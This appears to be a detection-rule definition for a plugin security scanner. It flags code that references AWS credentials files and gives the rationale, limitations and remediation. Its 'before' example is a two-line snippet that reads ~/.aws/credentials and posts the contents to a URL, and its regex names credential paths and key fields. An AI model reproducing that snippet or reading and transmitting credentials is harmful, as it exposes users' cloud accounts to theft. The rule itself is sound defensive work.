---
ruleId: SS-PLUGIN-SECRET-EXFIL-AWS-FILES-01
severity: critical
subScore: security
weight: 35
status: active
shadowUntil: null
appliesTo: [plugin]
frameworks: ["owasp-llm:llm02", "mitre-atlas:AML.T0025", "cwe:200"]
title: >-
  Reads your AWS credentials file
categoryLabel: >-
  Credential exfiltration
explanation: >-
  This plugin references the AWS credentials file or the access-key fields stored
  inside it ({match}). Those are long-lived keys with broad cloud access, so any
  code that reads them can hand your whole AWS account to whatever it contacts next.
severityRationale: >-
  full cloud credentials are tier-1 exfiltration material — a read here can mean
  total account takeover.
remediation:
  action: >-
    Remove the direct read of ~/.aws/credentials; let the AWS SDK resolve
    credentials through its standard provider chain instead.
  steps:
    - >-
      Delete code that opens or parses the credentials file or its key fields by
      hand.
    - >-
      Use the SDK's default credential resolution so secrets never pass through
      plugin code or leave the machine.
  saferPattern:
    before: |-
      creds = open(os.path.expanduser("~/.aws/credentials")).read()
      requests.post(url, data={"creds": creds})
    after: |-
      # let the SDK resolve credentials; never read or transmit the file yourself
      import boto3
      s3 = boto3.client("s3")
trigger:
  type: regex_match
  pattern: '(?i)(~/.aws/credentials|~/.aws/config|/\.aws/credentials|aws_access_key_id|aws_secret_access_key|aws_session_token)'
  scope:
    paths: ['**/*.py', '**/*.ts', '**/*.js', '**/*.mjs', '**/*.cjs', '**/*.go', '**/*.rb', '**/*.java']
limitations:
  - "Legitimate plugins that interact with AWS (deployment tools, S3 clients, etc.) need to reference the credentials file path. The rule's coarse detection means FP risk on every AWS-using plugin."
  - "Cannot distinguish a plugin that reads .aws/credentials in a documented, user-consented flow from one that does so for exfiltration."
  - "v2 will refine via composite (AWS-file read PLUS unexpected-endpoint HTTP call)."
priorArt:
  - https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html
  - https://snyk.io/blog/leaking-environment-variables-malicious-package/
  - https://attack.mitre.org/techniques/T1552/
---

# SS-PLUGIN-SECRET-EXFIL-AWS-FILES-01 — Plugin reads AWS credentials files

## Rationale

The AWS credentials file (`~/.aws/credentials`) and config file
(`~/.aws/config`) contain long-lived credentials with broad cloud access.
A plugin that reads these files is either a legitimate AWS-integration
tool or a credential-exfiltration vector — MITRE ATT&CK T1552
(Unsecured Credentials) catalogues this exact pattern.

The conservative-by-design pattern set (canonical paths plus the literal
credential-key names that appear inside the file) catches the explicit
read pattern. The rule is coarse and produces FP on every legitimate
AWS-using plugin; this is a deliberate design choice because the false-
negative cost (missing an exfiltrator) is worse than the false-positive
cost (a legitimate plugin documents its AWS usage in the vendor-appeal
channel).

Critical severity matches the impact: full cloud credentials are tier-1
exfiltration material. Active at landing on the same justification as
SS-PLUGIN-SECRET-EXFIL-ENV-NET-01.

## False positive history

(date-stamped log; updated by FP-audit harness and vendor-appeal outcomes)

## Version history

- v1 (2026-01-09): initial rule. Active at landing as coarse signal.
